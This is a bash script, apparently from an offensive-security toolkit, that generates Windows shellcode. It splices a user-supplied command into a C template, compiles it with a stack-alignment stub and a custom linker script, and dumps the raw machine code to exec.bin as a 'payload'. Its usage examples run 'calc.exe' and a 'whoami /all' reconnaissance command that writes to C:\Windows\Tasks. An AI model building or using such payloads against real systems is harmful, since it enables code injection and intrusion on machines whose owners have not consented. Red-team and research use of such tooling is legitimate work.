#!/usr/bin/env bash

# Usage:
#   generate.sh <CMD> <SHOWWINDOW>
# Examples:
#   generate.sh 'calc.exe' 10
#   generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt' 0

CMD="${1}"
SHOWWINDOW="${2}"  # https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow

CMD=`echo "${CMD}" | grep -o . | sed -e ':a;N;$!ba;s/\n/\x27,\x27/g'`
CMD="${CMD//\\/\\\\\\\\}"

cat template.c | sed "s#<CMD>#${CMD}#g" | sed "s#<SHOWWINDOW>#${SHOWWINDOW}#g" > exec.c
#cat exec.c | grep cmd_c

nasm -f win64 adjuststack.asm -o adjuststack.o

x86_64-w64-mingw32-gcc exec.c -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o exec.o -Wl,-Tlinker.ld,--no-seh

x86_64-w64-mingw32-ld -s adjuststack.o exec.o -o exec.exe

echo -e `for i in $(objdump -d exec.exe | grep "^ " | cut -f2); do echo -n "\x$i"; done` > exec.bin

if [ -f exec.bin ]; then
    echo "[*] Payload size: `stat -c%s exec.bin` bytes"
    echo "[+] Saved as: exec.bin"
fi

rm exec.exe exec.o exec.c adjuststack.o
